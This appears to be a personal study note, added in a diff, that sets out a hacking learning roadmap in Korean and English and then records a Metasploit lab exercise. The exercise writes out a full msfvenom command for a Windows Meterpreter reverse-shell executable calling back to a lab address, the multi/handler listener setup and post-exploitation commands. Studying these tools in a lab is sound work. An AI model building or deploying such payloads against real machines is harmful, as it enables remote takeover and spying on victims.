@@ -1,0 +1,48 @@
+
+1. program language : python, c/c++ -> assembly, machine language
+
+2. web hacking : html, javascript
+  ->owasp10 
+  ->PHP, JSPj, Nodejs
+
+3. network hacking : Socket program(python), OIS7 Layer
+  ->ARP Spoofing(pcap)
+  ->수학(정수론)-->RSA암호
+  ->wargame.kr
+
+4. System hacking : cumputer 구조, 운영체제, =>linux(c language)
+  ->BOF, Fvzzing, memory hacking(동적분석,ollydbg,치트엔진)
+  ->역assembler -IDA, Ghidra(정적분석)
+  ->pwable.kr
+
+5. 해킹방어대회(CTF) 영어로 출제, 기출문제
+  ->기관동아리 BoB, K-SHIETL
+
+6. 심화주제, 오픈소스 
+  ->RFID, AI(adversarial example), top conference(s&p, security)
+
+----------------------------------------------------------------------------
+*내컴에 test.exe 만들기  ->windows hacking
+
+>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=10.0.2.15 lport=4444 -o /root/test.exe
+   -->hacking file 만들기 :원격 연결 file
+>msfconsole  ->Matasploit 실행됨
+>msf5>use multi/handler
+
+>msf5>exploit(multi/handler)>set payload windows/meterpreter/reverse_tcp  :enter
+  payload => winddows/meterpreter/reverse_tcp
+>msf5 exploit(multi/handler)>set LHOST IPADDRESS(10.0.2.15)  :enter
+>msf5 exploit(mu......) > set LPORT 4444  :enter
+>msf5 exploit(mu...) > exploit -j
+
+  [*] Started..   .   --->success
+
+>windows에서 test.exe 실행하면 linux에서 session 1생성 됨
+ linux>session -i
+>msf5 exploit(multi/handler)) >session 1
+ [*] Starting interaction with 1....
+meterpreter >help
+meterpreter >cd desktop
+meterpreter >systeminfo
+meterpreter >screenshare
+
